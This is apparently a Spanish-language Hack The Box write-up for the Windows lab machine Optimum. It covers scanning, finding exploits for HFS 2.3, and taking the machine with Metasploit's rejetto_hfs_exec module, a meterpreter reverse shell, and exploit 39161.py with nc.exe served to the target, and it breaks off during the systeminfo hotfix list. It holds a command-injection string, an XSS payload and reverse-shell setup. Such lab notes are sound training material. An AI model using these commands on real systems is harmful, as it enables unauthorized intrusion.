@@ -1,0 +1,1437 @@
+		Optimum 10.10.10.8
+
++++++ INFORMACION ENTREGADA ++++++++++++++++++++++++++++++++++++++
+	Nombre: Optimum
+	Sistema Operativo: Windows
+	Dificultad: Facil
+	IP: 10.10.10.8
+
+
+-- PUERTOS:
+nmap -p- -Pn 10.10.10.8
+
+	PORT   STATE SERVICE
+	80/tcp open  http
+
+nmap -sC -sV -A -O -p80 10.10.10.8
+
+	PORT   STATE SERVICE VERSION
+	80/tcp open  http    HttpFileServer httpd 2.3
+	|_http-server-header: HFS 2.3
+	|_http-title: HFS /
+
+nmap -sU 10.10.10.8
+	
+	No hay puertos UDP abiertos.
+
+
+
+----- RESUMEN DE LA INFORMACION OBTENIDA ---------------------------
+
+	PORT 	PROTOCOLO	SERVICIO	VERSION 
+	80	TCP		http		HttpFileServer httpd 2.3
+
++++++ FASE DE ANALISIS DE VULNERABILIDADES +++++++++++++++++++++
+
+----- http: Conexion por el puerto 80 y version HttpFileServer httpd 2.3 ---------------------
+
+-- El plugin de Wappalyzer.
+	JavaScript libraries jQuery1.4.4
+	
+-- Aplicacion nmap script.
+
+nmap -v --script=*http* 10.10.10.8 -p80
+
+	80/tcp open  http                                                                                                                                        
+	| http-auth-finder:                                                                                                                                      
+	| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.8                                                                               
+	|   url                          method                                                                                                                  
+	|_  http://10.10.10.8:80/~login  HTTP: Basic                                                                                                             
+	| http-brute:                                                                                                                                            
+	|_  Path "/" does not require authentication                                                                                                             
+	|_http-chrono: Request times for /; avg: 285.55ms; min: 208.42ms; max: 414.48ms                                                                          
+	| http-comments-displayer:                                                                                                                               
+	| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.8                                                                               
+	|                                                                                                                                                        
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js                                                                                                 
+	|     Line number: 402                                                                                                                                   
+	|     Comment:                                                                                                                                           
+	|                                                                                                                                                        
+	|                                                                                                                                                        
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js                                                                                                 
+	|     Line number: 44                                                                                                                                    
+	|     Comment:                                                                                                                                           
+	|                                                                                                                                                        
+	|                                                                                                                                                        
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js                                                                                                 
+	|     Line number: 41                                                                                                                                    
+	|     Comment:                                                                                                                                           
+	|                                                                                                                                                        
+	|                                                                                                                                                        
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js                                                                                                 
+	|     Line number: 191                                                                                                                                   
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 153
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 164
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 133
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/
+	|     Line number: 20
+	|     Comment: 
+	|         <!-- -->
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 269
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 48
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 45
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 388
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 28
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 138
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 430
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 425
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 113
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 57
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 109
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/
+	|     Line number: 14
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 1
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 406
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 323
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 361
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 209
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 202
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 218
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 80
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 60
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 264
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 205
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 77
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 307
+	|     Comment: 
+	|         
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 29
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 290
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 71
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 54
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 123
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 249
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 20
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 159
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 8
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 13
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 43
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 212
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 315
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 196
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 34
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 53
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 215
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/
+	|     Line number: 120
+	|     Comment: 
+	|         <!-- Build-time: 0.000 -->
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 21
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 259
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=jquery
+	|     Line number: 123
+	|     Comment: 
+	|         /*"}},lastModified:{},etag:{},ajax:function(a){function b(){e.success&&
+	|         e.success.call(k,o,i,x);e.global&&f("ajaxSuccess",[x,e])}function d(){e.complete&&e.complete.call(k,x,i);e.global&&f("ajaxComplete",[x,e]);e.global&&!--c.active&&c.event.trigger("ajaxStop")}function f(q,p){(e.context?c(e.context):c.event).trigger(q,p)}var e=c.extend(true,{},c.ajaxSettings,a),j,i,o,k=a&&a.context||e,n=e.type.toUpperCase();if(e.data&&e.processData&&typeof e.data!=="string")e.data=c.param(e.data,e.traditional);if(e.dataType==="jsonp"){if(n==="GET")N.test(e.url)||(e.url+=(ka.test(e.url)?
+	|         "&":"?")+(e.jsonp||"callback")+"=?");else if(!e.data||!N.test(e.data))e.data=(e.data?e.data+"&":"")+(e.jsonp||"callback")+"=?";e.dataType="json"}if(e.dataType==="json"&&(e.data&&N.test(e.data)||N.test(e.url))){j=e.jsonpCallback||"jsonp"+sb++;if(e.data)e.data=(e.data+"").replace(N,"="+j+"$1");e.url=e.url.replace(N,"="+j+"$1");e.dataType="script";A[j]=A[j]||function(q){o=q;b();d();A[j]=w;try{delete A[j]}catch(p){}z&&z.removeChild(C)}}if(e.dataType==="script"&&e.cache===null)e.cache=false;if(e.cache===
+	|         false&&n==="GET"){var r=J(),u=e.url.replace(wb,"$1_="+r+"$2");e.url=u+(u===e.url?(ka.test(e.url)?"&":"?")+"_="+r:"")}if(e.data&&n==="GET")e.url+=(ka.test(e.url)?"&":"?")+e.data;e.global&&!c.active++&&c.event.trigger("ajaxStart");r=(r=xb.exec(e.url))&&(r[1]&&r[1]!==location.protocol||r[2]!==location.host);if(e.dataType==="script"&&n==="GET"&&r){var z=s.getElementsByTagName("head")[0]||s.documentElement,C=s.createElement("script");C.src=e.url;if(e.scriptCharset)C.charset=e.scriptCharset;if(!j){var B=
+	|         false;C.onload=C.onreadystatechange=function(){if(!B&&(!this.readyState||this.readyState==="loaded"||this.readyState==="complete")){B=true;b();d();C.onload=C.onreadystatechange=null;z&&C.parentNode&&z.removeChild(C)}}}z.insertBefore(C,z.firstChild);return w}var E=false,x=e.xhr();if(x){e.username?x.open(n,e.url,e.async,e.username,e.password):x.open(n,e.url,e.async);try{if(e.data||a&&a.contentType)x.setRequestHeader("Content-Type",e.contentType);if(e.ifModified){c.lastModified[e.url]&&x.setRequestHeader("If-Modified-Since",
+	|         c.lastModified[e.url]);c.etag[e.url]&&x.setRequestHeader("If-None-Match",c.etag[e.url])}r||x.setRequestHeader("X-Requested-With","XMLHttpRequest");x.setRequestHeader("Accept",e.dataType&&e.accepts[e.dataType]?e.accepts[e.dataType]+", */
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 434
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 15
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=section&id=lib.js
+	|     Line number: 70
+	|     Comment: 
+	|         
+	|     
+	|     Path: http://10.10.10.8:80/?mode=jquery
+	|     Line number: 1
+	|     Comment: 
+	|         /*!
+	|          * jQuery JavaScript Library v1.4.2
+	|          * http://jquery.com/
+	|          *
+	|          * Copyright 2010, John Resig
+	|          * Dual licensed under the MIT or GPL Version 2 licenses.
+	|          * http://jquery.org/license
+	|          *
+	|          * Includes Sizzle.js
+	|          * http://sizzlejs.com/
+	|          * Copyright 2010, The Dojo Foundation
+	|          * Released under the MIT, BSD, and GPL Licenses.
+	|          *
+	|          * Date: Sat Feb 13 22:33:48 2010 -0500
+	|_         */
+	|_http-csrf: Couldn't find any CSRF vulnerabilities.
+	|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
+	|_http-dombased-xss: Couldn't find any DOM based XSS.
+	|_http-drupal-enum: Nothing found amongst the top 100 resources,use --script-args number=<number|all> for deeper analysis)
+	|_http-errors: Couldn't find any error pages.
+	|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
+	|_http-feed: Couldn't find any feeds.
+	|_http-fetch: Please enter the complete path of the directory to save data in.
+	| http-fileupload-exploiter: 
+	|   
+	|_    Couldn't find a file-type field.
+	| http-headers: 
+	|   Content-Type: text/html
+	|   Content-Length: 3834
+	|   Accept-Ranges: bytes
+	|   Server: HFS 2.3
+	|   Set-Cookie: HFS_SID=0.960199302295223; path=/; 
+	|   Cache-Control: no-cache, no-store, must-revalidate, max-age=-1
+	|   
+	|_  (Request type: HEAD)
+	|_http-jsonp-detection: Couldn't find any JSONP endpoints.
+	|_http-litespeed-sourcecode-download: Page: /index.php was not found. Try with an existing file.
+	|_http-malware-host: Host appears to be clean
+	| http-methods: 
+	|_  Supported Methods: GET HEAD POST
+	|_http-mobileversion-checker: No mobile version detected.
+	| http-php-version: Logo query returned unknown hash 0e2b154630983d411488d2c5d229e4bf
+	|_Credits query returned unknown hash 36f78ced2f70812909954d3c81659e2a
+	| http-referer-checker: 
+	| Spidering limited to: maxpagecount=30
+	|_  http://ajax.googleapis.com:80/ajax/libs/jquery/1.4.4/jquery.js
+	| http-security-headers: 
+	|   Cache_Control: 
+	|_    Header: Cache-Control: no-cache, no-store, must-revalidate, max-age=-1
+	|_http-server-header: HFS 2.3
+	| http-sitemap-generator: 
+	|   Directory structure:
+	|     /
+	|       Other: 9; ico: 1
+	|   Longest directory structure:
+	|     Depth: 0
+	|     Dir: /
+	|   Total files found (by extension):
+	|_    Other: 9; ico: 1
+	|_http-slowloris: false
+	|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+	|_http-title: HFS /
+	| http-useragent-tester: 
+	|   Status for browser useragent: 200
+	|   Allowed User Agents: 
+	|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+	|     libwww
+	|     lwp-trivial
+	|     libcurl-agent/1.0
+	|     PHP/
+	|     Python-urllib/2.5
+	|     GT::WWW
+	|     Snoopy
+	|     MFC_Tear_Sample
+	|     HTTP::Lite
+	|     PHPCrawl
+	|     URI::Fetch
+	|     Zend_Http_Client
+	|     http client
+	|     PECL::HTTP
+	|     Wget/1.13.4 (linux-gnu)
+	|_    WWW-Mechanize/1.34
+	| http-vhosts: 
+	| 18 names had status ERROR
+	|_109 names had status 200
+	| http-vuln-cve2011-3192: 
+	|   VULNERABLE:
+	|   Apache byterange filter DoS
+	|     State: VULNERABLE
+	|     IDs:  CVE:CVE-2011-3192  BID:49303
+	|       The Apache web server is vulnerable to a denial of service attack when numerous
+	|       overlapping byte ranges are requested.
+	|     Disclosure date: 2011-08-19
+	|     References:
+	|       https://seclists.org/fulldisclosure/2011/Aug/175
+	|       https://www.securityfocus.com/bid/49303
+	|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
+	|_      https://www.tenable.com/plugins/nessus/55976
+	|_http-wordpress-enum: Nothing found amongst the top 100 resources,use --script-args search-limit=<number|all> for deeper analysis)
+	|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
+	|_http-xssed: No previously reported XSS vuln.
+
+	NSE: Script Post-scanning.
+	Initiating NSE at 06:48
+	Completed NSE at 06:48, 0.00s elapsed
+	Initiating NSE at 06:48
+	Completed NSE at 06:48, 0.00s elapsed
+	Read data files from: /usr/bin/../share/nmap
+	Nmap done: 1 IP address (1 host up) scanned in 10256.14 seconds
+			   Raw packets sent: 5 (196B) | Rcvd: 2 (72B)
+
+-- Aplicacion Nikto.
+	nikto -h 10.10.10.8 -p 80
+	
+	- Nikto v2.1.6
+	---------------------------------------------------------------------------
+	+ Target IP:          10.10.10.8
+	+ Target Hostname:    10.10.10.8
+	+ Target Port:        80
+	+ Start Time:         2020-05-07 04:24:46 (GMT-4)
+	---------------------------------------------------------------------------
+	+ Server: HFS 2.3
+	+ Cookie HFS_SID created without the httponly flag
+	+ The anti-clickjacking X-Frame-Options header is not present.
+	+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+	+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fas
+	+ No CGI Directories found (use '-C all' to force check all possible dirs)
+	+ OSVDB-38019: /?mod=<script>alert(document.cookie)</script>&op=browse: Sage 1.0b3 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+	+ 7864 requests: 0 error(s) and 5 item(s) reported on remote host
+	+ End Time:           2020-05-07 04:37:14 (GMT-4) (748 seconds)
+	---------------------------------------------------------------------------
+
+	*Encuentra la aplicacion Sage 1.0b3
+	Vulnerabilidad poniendo /?mod=<script>alert(document.cookie)</script>&op=browse 
+
+-- Aplicación searchsploit
+
+	searchsploit HTTP FILE SERVER 2.3
+	---------------------------------------------------------------------------------------------------------------- 
+	 Exploit Title                                                          	|  Path                                  
+																				| (/usr/share/exploitdb/)                
+	---------------------------------------------------------------------------------------------------------------- 
+	Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload              | exploits/multiple/remote/30850.txt
+	Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)         | exploits/windows/remote/34668.txt
+	Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)         | exploits/windows/remote/39161.py
+	Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution    | exploits/windows/webapps/34852.txt
+	---------------------------------------------------------------------------------------------------------------- 
+	El primero investigar mas despacio no lo consigue compilar.
+	El segundo hay que ejecutar http://localhost:80/?search=%00{.exec|cmd.} y tener un payload multiple abierto.
+	El tercero se cambia la ip y el puerto. lo ejecuta y no contesta nada.
+	El cuerto investigar el contenido para el fichero bug-utf8.txt
+	
+	
+	searchsploit jQuery 1.4
+	Exploits: No Result
+	Shellcodes: No Result
+
+
+
+-- Aplicacion dirb:
+
+	dirb http://10.10.10.8:80/
+	
+	-----------------
+	DIRB v2.22    
+	By The Dark Raver
+	-----------------
+	START_TIME: Thu May  7 04:41:14 2020
+	URL_BASE: http://10.10.10.8:80/
+	WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+	-----------------
+	GENERATED WORDS: 4612                                                          
+	---- Scanning URL: http://10.10.10.8:80/ ----
+	+ http://10.10.10.8:80/favicon.ico (CODE:200|SIZE:576)
+		-----------------
+	END_TIME: Thu May  7 04:48:13 2020
+	DOWNLOADED: 4612 - FOUND: 1
+
+-- Aplicacion uniscan:
+
+	uniscan -u 10.10.10.8 -qweds
+	####################################
+	# Uniscan project                  #
+	# http://uniscan.sourceforge.net/  #
+	####################################
+	V. 6.3
+
+
+	Scan date: 7-5-2020 5:0:58
+	===================================================================================================
+	| Domain: http://10.10.10.8/
+	| Server: HFS 2.3
+	| IP: 10.10.10.8
+	===================================================================================================
+	|
+	| Directory check:
+	===================================================================================================
+	|                                                                                                   
+	| File check:
+	| [+] CODE: 200 URL: http://10.10.10.8/favicon.ico
+	===================================================================================================
+	|
+	| Check robots.txt:
+	|
+	| Check sitemap.xml:
+	===================================================================================================
+	|
+	| Crawler Started:
+	| Plugin name: External Host Detect v.1.2 Loaded.
+	| Plugin name: Timthumb <= 1.32 vulnerability v.1 Loaded.
+	| Plugin name: Upload Form Detect v.1.1 Loaded.
+	| Plugin name: E-mail Detection v.1.1 Loaded.
+	| Plugin name: phpinfo() Disclosure v.1 Loaded.
+	| Plugin name: Code Disclosure v.1.1 Loaded.
+	| Plugin name: FCKeditor upload test v.1 Loaded.
+	| Plugin name: Web Backdoor Disclosure v.1.1 Loaded.
+	| [+] Crawling finished, 21 URL's found!
+	|                                                                                                                                   
+	| External hosts:                                                                                                   
+	| [+] External Host Found: http://www.rejetto.com                                                               
+	|                                                                                                        
+	| Timthumb:                                                                                            
+	|                                                                                                    
+	| File Upload Forms:                                                                                 
+	|                                                                                                    
+	| E-mails:                                                                                           
+	|                                                                                                    
+	| PHPinfo() Disclosure:                                                                              
+	|                                                                                                     
+	| Source Code Disclosure:                                                                              
+	|                                                                                                      
+	| FCKeditor File Upload:                                                                               
+	|                                                                                                     
+	| Web Backdoors:                                                                                      
+	|                                                                                                     
+	| Ignored Files:                                                                                      
+	===================================================================================================   
+	| Dynamic tests:                                                                                          
+	| Plugin name: Learning New Directories v.1.2 Loaded.                                                      
+	| Plugin name: FCKedior tests v.1.1 Loaded.                                                                 
+	| Plugin name: Timthumb <= 1.32 vulnerability v.1 Loaded.                                                   
+	| Plugin name: Find Backup Files v.1.2 Loaded.                                                               
+	| Plugin name: Blind SQL-injection tests v.1.3 Loaded.                                                       
+	| Plugin name: Local File Include tests v.1.1 Loaded.                                                         
+	| Plugin name: PHP CGI Argument Injection v.1.1 Loaded.
+	| Plugin name: Remote Command Execution tests v.1.1 Loaded.
+	| Plugin name: Remote File Include tests v.1.2 Loaded.
+	| Plugin name: SQL-injection tests v.1.2 Loaded.
+	| Plugin name: Cross-Site Scripting tests v.1.2 Loaded.
+	| Plugin name: Web Shell Finder v.1.3 Loaded.
+	| [+] 0 New directories added
+	|                                                                                                   
+	|                                                                                                   
+	| FCKeditor tests:
+	|                                                                                                   
+	|                                                                                                   
+	| Timthumb < 1.33 vulnerability:
+	|                                                                                                   
+	|                                                                                                   
+	| Backup Files:
+	|                                                                                                   
+	|                                                                                                   
+	| Blind SQL Injection:
+	|                                                                                                   
+	|                                                                                                   
+	| Local File Include:
+	|                                                                                                   
+	|                                                                                                   
+	| PHP CGI Argument Injection:
+	|                                                                                                   
+	|                                                                                                   
+	| Remote Command Execution:
+	|                                                                                                   
+	|                                                                                                   
+	| Remote File Include:
+	|                                                                                                   
+	|                                                                                                   
+	| SQL Injection:
+	|                                                                                                   
+	|                                                                                                   
+	| Cross-Site Scripting (XSS):
+	|                                                                                                   
+	|                                                                                                   
+	| Web Shell Finder:
+	===================================================================================================
+	| Static tests:
+	| Plugin name: Local File Include tests v.1.1 Loaded.
+	| Plugin name: Remote Command Execution tests v.1.1 Loaded.
+	| Plugin name: Remote File Include tests v.1.1 Loaded.
+	|                                                                                                   
+	|                                                                                                   
+	| Local File Include:
+	|                                                                                                   
+	|                                                                                                   
+	| Remote Command Execution:
+	|                                                                                                   
+	|                                                                                                   
+	| Remote File Include:
+	===================================================================================================
+	Scan end date: 7-5-2020 5:5:24
+
+-- Aplicacion Metasploit:
+	msf5 > search HttpFileServer
+	
+	Matching Modules
+	================
+
+   #  Name                                   Disclosure Date  Rank       Check  Description
+   -  ----                                   ---------------  ----       -----  -----------
+   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
+
++++++ FASE DE EXPLOTACION ++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+//////////////////////////// OPCION 1 ///////////////////////////////////////////////////////////////////
+
+	msf5 > use exploit/windows/http/rejetto_hfs_exec 
+	msf5 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.10.10.8
+	msf5 exploit(windows/http/rejetto_hfs_exec) > set payload windows/x64/meterpreter/reverse_tcp
+	msf5 exploit(windows/http/rejetto_hfs_exec) > set lhost 10.10.14.8
+	msf5 exploit(windows/http/rejetto_hfs_exec) > set SRVHOST 10.10.14.8 
+	msf5 exploit(windows/http/rejetto_hfs_exec) > exploit
+
+	[*] Started reverse TCP handler on 10.10.14.11:4444 
+	[*] Using URL: http://0.0.0.0:8080/UJ5sXPNFEchNB8m
+	[*] Local IP: http://192.168.64.134:8080/UJ5sXPNFEchNB8m
+	[*] Server started.
+	[*] Sending a malicious request to /
+	[*] Payload request received: /UJ5sXPNFEchNB8m
+	[*] Sending stage (180291 bytes) to 10.10.10.8
+	[*] Meterpreter session 1 opened (10.10.14.11:4444 -> 10.10.10.8:49178) at 2020-05-07 05:05:36 -0400
+	[!] Tried to delete %TEMP%\vLEsobgfG.vbs, unknown result
+	[*] Server stopped.
+
+	meterpreter > shell
+	Process 1216 created.
+	Channel 2 created.
+	Microsoft Windows [Version 6.3.9600]
+	(c) 2013 Microsoft Corporation. All rights reserved.
+
+	C:\Users\kostas\Desktop>whoami
+	whoami
+	optimum\kostas
+
+	C:\Users\kostas\Desktop>
+
+	Volver a meterpreter y ejecuto:
+	meterpreter > sysinfo
+	Computer        : OPTIMUM
+	OS              : Windows 2012 R2 (6.3 Build 9600).
+	Architecture    : x64
+	System Language : el_GR
+	Domain          : HTB
+	Logged On Users : 1
+	Meterpreter     : x86/windows
+
+	meterpreter > getuid
+	Server username: OPTIMUM\kostas
+
+	getsystem, hashdump --> no tenemos permisos.
+	
+-- Elevar privilegios.
+
+	Crear elevacion de privilegios pon una reverse shell.
+
+	searchsploit HFS
+	[*] exec: searchsploit HFS
+
+	---------------------------------------------------------------------- ----------------------------------------
+	 Exploit Title                                                        |  Path
+																		  | (/usr/share/exploitdb/)
+	---------------------------------------------------------------------- ----------------------------------------
+	Apple Mac OSX 10.4.8 - DMG HFS+ DO_HFS_TRUNCATE Denial of Service     | exploits/osx/dos/29454.txt
+	Apple Mac OSX 10.6 - HFS FileSystem (Denial of Service)               | exploits/osx/dos/12375.c
+	Apple Mac OSX 10.6.x - HFS Subsystem Information Disclosure           | exploits/osx/local/35488.c
+	Apple Mac OSX xnu 1228.x - 'hfs-fcntl' Kernel Privilege Escalation    | exploits/osx/local/8266.txt
+	FHFS - FTP/HTTP File Server 2.1.2 Remote Command Execution            | exploits/windows/remote/37985.py
+	Linux Kernel 2.6.x - SquashFS Double-Free Denial of Service           | exploits/linux/dos/28895.txt
+	Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit | exploits/windows/remote/34926.rb
+	Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities     | exploits/windows/remote/31056.py
+	Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload        | exploits/multiple/remote/30850.txt
+	Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)   | exploits/windows/remote/34668.txt
+	Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)   | exploits/windows/remote/39161.py
+	Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execut | exploits/windows/webapps/34852.txt
+	---------------------------------------------------------------------- ----------------------------------------
+	searchsploit -x 39161.py
+	Modificar el fichero 39161.py y poner la ip del equipo atacante.
+		ip_addr = "10.10.14.15" #local IP address
+		local_port = "443" # Local Port number
+	Crear el directorio www
+	copiar nc.exe en el directorio www
+		root@kali:~/Desktop/HACKTHEBOX/Optimum_10.10.10.8/www# cp /usr/share/windows-resources/binaries/nc.exe .
+	
+	En otra consola en el mismo directorio ejecutar un servidor python.
+	python -m SimpleHTTPServer 80
+	En otra consola en el mismo directorio ejecutar un  enlace.
+	nc -nvlp 443 10.10.10.8
+	En la primera consola en el mismo directorio ejecutar:
+	python 39161.py 10.10.10.8 80
+	Consigo nuevamente una consola sin usuario administrador.
+	Ejecuto el comando systeminfo, para obtener mas información.
+	C:\Users\kostas>systeminfo
+
+	Host Name:                 OPTIMUM
+	OS Name:                   Microsoft Windows Server 2012 R2 Standard
+	OS Version:                6.3.9600 N/A Build 9600
+	OS Manufacturer:           Microsoft Corporation
+	OS Configuration:          Standalone Server
+	OS Build Type:             Multiprocessor Free
+	Registered Owner:          Windows User
+	Registered Organization:   
+	Product ID:                00252-70000-00000-AA535
+	Original Install Date:     18/3/2017, 1:51:36 ��
+	System Boot Time:          16/5/2020, 6:59:37 ��
+	System Manufacturer:       VMware, Inc.
+	System Model:              VMware Virtual Platform
+	System Type:               x64-based PC
+	Processor(s):              1 Processor(s) Installed.
+							   [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+	BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+	Windows Directory:         C:\Windows
+	System Directory:          C:\Windows\system32
+	Boot Device:               \Device\HarddiskVolume1
+	System Locale:             el;Greek
+	Input Locale:              en-us;English (United States)
+	Time Zone:                 (UTC+02:00) Athens, Bucharest
+	Total Physical Memory:     4.095 MB
+	Available Physical Memory: 3.467 MB
+	Virtual Memory: Max Size:  5.503 MB
+	Virtual Memory: Available: 4.917 MB
+	Virtual Memory: In Use:    586 MB
+	Page File Location(s):     C:\pagefile.sys
+	Domain:                    HTB
+	Logon Server:              \\OPTIMUM
+	Hotfix(s):                 31 Hotfix(s) Installed.
+							   [01]: KB2959936
+							   [02]: KB2896496
+							   [03]: KB2919355
+							   [04]: KB2920189
+							   [05]: KB2928120
+							   [06]: KB2931358
+							   [07]: KB2931366
+							   [08]: KB2933826
+							   [09]: KB2938772
+							   [10]: KB2949621
+							   [11]: KB2954879
+							   [12]: KB2958262
+							   [13]: KB2958263
+							   [14]: KB2961072
+							   [15]: KB2965500
+							   [16]: KB2966407
+							   [17]: KB2967917
+							   [18]: KB2971203
+							   [19]: KB2971850
+							   [20]: KB2973351
+							   [21]: KB2973448
+							   [22]: KB2975061
+							   [23]: KB2976627
+							   [24]: KB2977629
+							   [25]: KB2981580
